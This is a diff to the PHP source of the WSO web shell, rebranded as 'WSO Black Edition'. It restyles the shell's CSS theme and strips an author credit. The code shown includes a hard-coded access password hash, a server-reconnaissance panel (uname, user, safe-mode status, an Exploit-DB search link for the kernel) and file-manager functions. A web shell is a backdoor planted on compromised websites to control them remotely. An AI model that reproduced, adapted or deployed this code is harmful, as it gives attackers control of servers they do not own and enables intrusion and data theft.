@@ -1,5 +1,3 @@
-
-$ cat files-data.php
 <?php
 $_password = "b269919a5ed136301ea07bde3f320e7c";
 $_agent = true;
@@ -87,52 +85,12 @@ if($os == 'win') {
 }
 if($cwd[strlen($cwd)-1] != '/')
 	$cwd .= '/';
-/* (С) 04.2015 Pirat */
+
 function hardHeader() {
 	if(empty($_POST['charset']))
 		$_POST['charset'] = $GLOBALS['_unicode'];
-	echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>" . $_SERVER['HTTP_HOST'] . " - WSO " . VERSION ."</title>
-<style>
-	.e, .v, .h, .h th {background-color:#060A10 !important; border: none !important;}
-	body {background-color:#060A10; color:#e1e1e1; margin:0; font:normal 75% Arial, Helvetica, sans-serif; } canvas{ display: block; vertical-align: bottom;}
-	body,td,th	{font:10pt tahoma,arial,verdana,sans-serif,Lucida Sans;margin:0;vertical-align:top;}
-	table		{width:inherit !important; box-shadow: none !important;}
-	table.info	{background:#060a10; color:#C3C3C3;}
-	table.main	{width:100% !important;}
-	table#toolsTbl {background-color: #060A10;}
-	span,h1,a	{color:#fff !important;}
-	span		{font-weight:bolder;}
-	h1			{border-left:5px solid #2E6E9C;padding:2px 5px;font:14pt Verdana;background-color:#10151c;margin:0px;}
-	div.content	{padding:5px;margin-left:5px;background-color:#060a10;}
-	a			{text-decoration:none;}
-	a:hover		{text-decoration:underline;}
-	.tooltip::after {background:#0663D5;color:#FFF;content: attr(data-tooltip);margin-top:-50px;display:block;padding:6px 10px;position:absolute;visibility:hidden;}
-	.tooltip:hover::after {opacity:1;visibility:visible;}
-	.ml1		{border:1px solid #12151d;padding:5px;margin:0;overflow:auto;}
-	.bigarea	{min-width:100%; max-width:100%; height:400px;}
-	input, textarea, select	{margin:0; padding-top:2px; color:#fff;background-color:#12151d;border:none;font:9pt Courier New;outline:none;}
-	input:hover, textarea:hover, select:hover {background-color:#202832;}
-	input:focus, textarea:focus, select:focus {background-color:#202832;}
-	input:-webkit-autofill {-webkit-box-shadow: inset 0 0 0 50px #12151d !important;-webkit-text-fill-color: #fff !important;color: #fff !important;}
-	label {position:relative}
-	label:after {content:'<>';font:10px 'Consolas', monospace;color:#fff;-webkit-transform:rotate(90deg);-moz-transform:rotate(90deg);-ms-transform:rotate(90deg);transform:rotate(90deg);right:3px; top:3px;padding:0;position:absolute;pointer-events:none;}
-	label:before {content:'';right:0; top:0;width:17px; height:17px;background:#202832;position:absolute;pointer-events:none;display:block;}
-	form		{margin:0px;}
-	#toolsTbl	{text-align:center;}
-	#fak 		{background:none;}
-	#fak td 	{padding:5px 0 0 0;}
-	iframe		{border:1px solid #060a10;}
-	.toolsInp	{width:300px}
-	.main th	{text-align:left;background-color:#060a10;}
-	.main td, th{vertical-align:middle;}
-	input[type='submit']{background-color:#2E6E9C;}
-	input[type='button']{background-color:#2E6E9C;}
-	input[type='submit']:hover{background-color:#56AD15;}
-	input[type='button']:hover{background-color:#56AD15;}
-	.l1			{background-color:#12151d;}
-	.fm tr:hover {background-color:#202832;}
-	pre			{font:9pt Courier New;}
-</style>
+	echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>" . $_SERVER['HTTP_HOST'] . " - WSO Black Edition " . VERSION ."</title>
+<style>body{background-size:cover;background-repeat:no-repeat;background-attachment:fixed;background-color:#000;color:#e1e1e1;margin:0;font:normal 75% Arial,Helvetica,sans-serif}.e,.v,.h,.h th{background-color:#000!important;border:none!important}canvas{display:block;vertical-align:bottom}body,td,th{font:10pt tahoma,arial,verdana,sans-serif,Lucida Sans;margin:0;vertical-align:top}table{width:inherit!important;box-shadow:none!important}table.info{background:#000;color:#C3C3C3}table.main{width:100%!important}table#toolsTbl{background-color:#000}span,h1,a{color:#fff!important}span{font-weight:bolder}h1{border-left:5px solid #fff;padding:2px 5px;font:14pt Verdana;background-color:#000;margin:0}div.content{padding:5px;margin-left:5px;background-color:#000}a{text-decoration:none}a:hover{text-decoration:underline}.tooltip::after{background:#000;color:#FFF;content:attr(data-tooltip);margin-top:-50px;display:block;padding:6px 10px;position:absolute;visibility:hidden}.tooltip:hover::after{opacity:1;visibility:visible}.ml1{border:1px solid #000;padding:5px;margin:0;overflow:auto}.bigarea{min-width:100%;max-width:100%;height:400px}input,textarea,select{margin:0;padding-top:2px;color:#fff;background-color:#000;border:none;font:9pt Courier New;outline:none}input:hover,textarea:hover,select:hover{background-color:#1a1a1a}input:focus,textarea:focus,select:focus{background-color:#1a1a1a}input:-webkit-autofill{-webkit-box-shadow:inset 0 0 0 50px #000!important;-webkit-text-fill-color:#fff!important;color:#fff!important}label{position:relative}label:after{content:'<>';font:10px 'Consolas',monospace;color:#fff;-webkit-transform:rotate(90deg);-moz-transform:rotate(90deg);-ms-transform:rotate(90deg);transform:rotate(90deg);right:3px;top:3px;padding:0;position:absolute;pointer-events:none}label:before{content:'';right:0;top:0;width:17px;height:17px;background:#1a1a1a;position:absolute;pointer-events:none;display:block}form{margin:0}#toolsTbl{text-align:center}#fak{background:none}#fak td{padding:5px 0 0 0}iframe{border:1px solid #000}.toolsInp{width:300px}.main th{text-align:left;background-color:#000}.main td,th{vertical-align:middle}input[type='submit']{background-color:#fff;color:#000}input[type='button']{background-color:#fff;color:#000}input[type='submit']:hover{background-color:#cccccc}input[type='button']:hover{background-color:#cccccc}.l1{background-color:#000}.fm tr:hover{background-color:#1a1a1a}pre{font:9pt Courier New}</style>
 <script>
     var c_ = '" . htmlspecialchars($GLOBALS['cwd']) . "';
     var a_ = '" . htmlspecialchars(@$_POST['a']) ."'
@@ -252,7 +210,7 @@ function hardHeader() {
 	echo '<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:'.($GLOBALS['os'] == 'win'?'<br>Drives:':'').'</span></td>'.
 		 '<td><nobr>'.substr(@php_uname(), 0, 120).' <a href="http://noreferer.de/?http://www.google.com/search?q='.urlencode(@php_uname()).'" target="_blank">[ Google ]</a> <a href="'.$explink.'" target=_blank>[ Exploit-DB ]</a></nobr><br>'.$uid.' ( '.$user.' ) <span>Group:</span> '.$gid.' ( ' .$group. ' )<br>'.@phpversion().' <span>Safe mode:</span> '.($GLOBALS['safe_mode']?'<font color=red>ON</font>':'<font color=#FFDB5F><b>OFF</b></font>').' <a href=# onclick="g(\'Php\',null,null,\'info\')">[ phpinfo ]</a> <span>Datetime:</span> '.date('Y-m-d H:i:s').'<br>'.viewSize($totalSpace).' <span>Free:</span> '.viewSize($freeSpace).' ('.round(100/($totalSpace/$freeSpace),2).'%)<br>'.$cwd_links.' '.viewPermsColor($GLOBALS['cwd']).' <a href=# onclick="g(\'FilesMan\',\''.$GLOBALS['home_cwd'].'\',\'\',\'\',\'\')">[ home ]</a><br>'.$drives.'</td>'.
 		 '<td width=1 align=right><nobr><label><select onchange="g(null,null,null,null,null,this.value)">'.$opt_charsets.'</select></label><br><span>Server IP:</span><br>'.gethostbyname($_SERVER["HTTP_HOST"]).'<br><span>Client IP:</span><br>'.$_SERVER['REMOTE_ADDR'].'</nobr></td></tr></table>'.
-		 '<table style="background-color:#2E6E9C;" cellpadding=3 cellspacing=0 width=100%><tr>'.$menu.'</tr></table><div>';
+		 '<table style="background-color:#1b1d21;" cellpadding=3 cellspacing=0 width=100%><tr>'.$menu.'</tr></table><div>';
 }
 function hardFooter() {
 	$is_writable = is_writable($GLOBALS['cwd'])?" <font color='#FFDB5F'>[ Writeable ]</font>":" <font color=red>(Not writable)</font>";
@@ -610,7 +568,7 @@ function actionFilesTools() {
 					$h[2] .= "\n";
 				}
 		 	}
-			echo '<table cellspacing=1 cellpadding=5 bgcolor=#222><tr><td bgcolor=#12151d><span style="font-weight: normal;"><pre>'.$h[0].'</pre></span></td><td bgcolor=#060a10><pre>'.$h[1].'</pre></td><td bgcolor=#12151d><pre>'.htmlspecialchars($h[2]).'</pre></td></tr></table>';
+			echo '<table cellspacing=1 cellpadding=5 bgcolor=#222><tr><td bgcolor=#12151d><span style="font-weight: normal;"><pre>'.$h[0].'</pre></span></td><td bgcolor=#000000><pre>'.$h[1].'</pre></td><td bgcolor=#12151d><pre>'.htmlspecialchars($h[2]).'</pre></td></tr></table>';
 			break;
 		case 'rename':
 			if( !empty($_POST['p3']) ) {
